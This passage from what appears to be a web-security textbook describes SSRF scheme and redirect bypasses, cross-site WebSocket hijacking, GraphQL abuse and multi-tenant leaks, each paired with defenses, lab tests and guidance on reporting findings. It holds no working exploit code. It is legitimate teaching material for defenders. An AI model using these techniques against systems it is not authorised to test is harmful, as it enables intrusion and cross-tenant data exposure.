- **Redirect chains and non-HTTP schemes:** validation on the first hop only, or support for `gopher://`, `file://`, `dict://`, enables protocol smuggling into internal services.

Lab-safe proof uses a listener you control and your own lab host as the internal target. Defense: scheme/host/port allow-lists, resolve-and-pin, block private/link-local/loopback ranges in IPv4 and IPv6, disable redirects or re-validate each hop, and enforce egress firewalling plus IMDSv2 on cloud. Verify each bypass payload is neutralized.

### 10.29.2 Cross-site WebSocket hijacking (CSWSH)

Because WebSockets are not governed by SOP, a cross-site page can open a socket using the victim's cookies. If the server authenticates only the handshake and not individual messages, the attacker can issue privileged commands. Lab test: host a page on a second origin that connects to `wss://<LAB_HOST>/ws` and sends a message that changes lab state; check whether `Origin` validation blocks it. Defense: validate `Origin` exactly, require a per-session CSRF-style token in the handshake or each message, authorize every message, and limit frame size/rate. Verify by replaying from a disallowed origin and confirming rejection.

### 10.29.3 GraphQL abuse and multi-tenant failures

GraphQL adds amplifications: alias batching multiplies an expensive field within one request; nested queries expand exponentially; and resolvers may authorize the detail query but not the list query. In a lab, measure query cost with depth/complexity probes, then test every resolver with a second account. Defense: depth/complexity/cost limits, alias and batch caps, persisted queries, and resolver-level authorization.

Multi-tenant failures extend to caches (keyed by object ID but not tenant), object storage prefixes, search indices, logs, and background jobs trusting a tenant ID from the message. Test with two of your own tenants and verify that *every* layer scopes to the authenticated tenant. Common mistake: fixing the database query but leaving the cache or async job cross-tenant.

## 10.30 Mastery Deep Dive: Reporting and Regression for Complex Chains

Advanced findings live or die by the quality of their documentation. For each link in a chain, record: the exact raw request bytes (including framing and headers), the component that misinterpreted them, the capability gained, and the observed effect with your own test accounts. Assemble a step-by-step proof of concept that a reader can reproduce in the same lab, note prerequisites honestly (authentication level, victim interaction, timing sensitivity), and assess severity by the *final* capability, not the isolated bug. Map each link to CWE where applicable.

Calibrate severity carefully: a desync that only causes a delay is low; one that leaks another lab user's session is high; cache poisoning that stores benign markers in your lab is a proof, while the same primitive reaching every visitor in production would be critical — describe that potential without claiming unverified real-world impact. For timing- and state-dependent issues, run the PoC multiple times and report a success rate rather than a single anecdote.

Regression artifacts are the bridge to verification: save the exact payload, the vulnerable response, and the expected hardened response for each finding. After a fix, replay the artifact under the same conditions and confirm consistent rejection — for races, smuggling, and cache bugs, repeat enough times to rule out variance. Common mistake: reporting "fixed" after one passing run; require repeatable, evidence-backed confirmation, and keep the lab artifacts for future regression testing.

One final discipline note for this chapter's techniques: every advanced method described here — desync, cache poisoning, gadget chains, SSTI escalation, and parser-differential fuzzing — must be confined to an isolated lab, an application you own, or an engagement with explicit written scope. These techniques can disrupt shared infrastructure and affect other users unintentionally, so authorization and containment are prerequisites, not afterthoughts.

## 10.14 Key Takeaways

- Advanced research is about chaining capabilities and questioning component boundaries.
- Desync, caching, races, and prototype pollution arise from subtle implementation details.
- OAuth/JWT/GraphQL/WebSocket security depends on rigorous validation at each step.
- Multi-tenant isolation must be verified at every layer with controlled test tenants.
